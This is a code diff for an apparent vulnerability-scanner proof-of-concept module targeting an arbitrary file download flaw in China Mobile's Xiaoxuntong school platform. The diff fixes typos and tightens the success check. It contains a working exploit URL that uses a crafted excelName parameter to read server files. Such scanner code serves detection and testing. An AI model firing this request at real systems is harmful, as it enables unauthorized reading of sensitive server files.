@@ -12,11 +12,11 @@ class Vuln(ABVuln):
     desc = '''
         中国移动旗下校讯通平台任意文件下载漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
     ''' # 漏洞描述
-    ref = 'Uknown' #https://wooyun.shuimugan.com/bug/view?bug_no=110419
-    cnvd_id = 'Uknown' # cnvd漏洞编号
-    cve_id = 'Uknown'  # cve编号
+    ref = 'Unknown' #https://wooyun.shuimugan.com/bug/view?bug_no=110419
+    cnvd_id = 'Unknown' # cnvd漏洞编号
+    cve_id = 'Unknown'  # cve编号
     product = '中国移动'  # 漏洞组件名称
-    product_version = 'Uknown'  # 漏洞应用版本
+    product_version = 'Unknown'  # 漏洞应用版本
 
 class Poc(ABPoc):
     poc_id = '1041daf2-9887-49a6-b706-5a7c096a3d5f' # 平台 POC 编号
@@ -33,7 +33,7 @@ class Poc(ABPoc):
             arg = '{target}'.format(target=self.target)
             vul_url = arg + '/download/downloadExcel.jsp?excelName=.%2Fdownload%2FdownloadExcel.jsp&downloadId=1677'
             response = requests.get(vul_url)
-            if response.status_code ==200:
+            if response.status_code == 200 and 'downloadExcel.jsp' in response.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
 
         except Exception, e:
